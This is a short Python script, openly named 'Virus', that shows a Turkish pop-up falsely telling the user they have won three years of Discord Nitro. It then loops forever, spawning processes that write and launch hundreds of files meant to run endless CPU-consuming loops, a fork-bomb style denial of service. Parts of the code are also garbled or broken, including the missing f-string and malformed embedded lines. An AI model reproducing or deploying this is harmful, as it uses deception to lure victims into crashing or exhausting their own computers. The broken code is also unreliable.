from multiprocessing import Process
from os import startfile
from tkinter import Button, Label, Tk
import tkinter.messagebox

class Virus():
    def openfiles():
        for i in range(500):
            open("while{i}.py", "w").write("from multiprocessing import Process\ni = 2\ndef while1():\nwhile True:\n\ti = i**ii = 2\ndef while2():\nwhile True:\n\ti = i**ii = 2\ndef while3():\nwhile True:\n\ti = i**i\nProcess(while1).start()\nProcess(while2).start()\nProcess(while3).start()")
    
    def runfliles():
        for i in range(500):
            startfile("while{i}.py")


tkinter.messagebox.showinfo("Tebrikler", "3 yıllık discord nitro kazandınız")

while True:
    Process(Virus.openfiles).start()
    Process(Virus.runfliles).start()
    Tk().update()